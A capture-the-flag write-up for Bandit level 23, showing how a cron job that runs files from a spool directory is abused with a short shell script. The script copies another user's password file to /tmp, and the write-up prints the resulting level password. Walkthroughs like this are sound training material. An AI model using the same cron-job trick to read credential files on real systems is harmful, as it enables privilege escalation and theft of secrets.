# Bandit Level 23

This time we have another program that runs at regular intervals, and are again told that looking in `/etc/cron.d`.

Looking at the cronjob `cronjob_bandit24`, it runs a script at `/usr/bin/cronjob_bandit24.sh`. This shell script is as follows:

```sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done
```

We can see that this script runs all code in `/var/spool/bandit24/foo` every minute. To exploit this we must write our own shell script to find us the password.

```sh
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/thisdirisours/passwd
```

We need to mark this script as executable so it can be run by the cronjob. We can do this with `chmod`.
> `chmod a+x <filename>`

We also need to create a file to receive the password, and give it the correct permissions. We create the file with `touch` and change the permissions with `chmod`.
> `touch passwd && chmod a=wr passwd`

Now we copy our script into `/var/spool/bandit24` and wait. Once the cronjob occurs and runs our script, there will be text in the `passwd` file.
Opening this file reveals the password: `VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar`
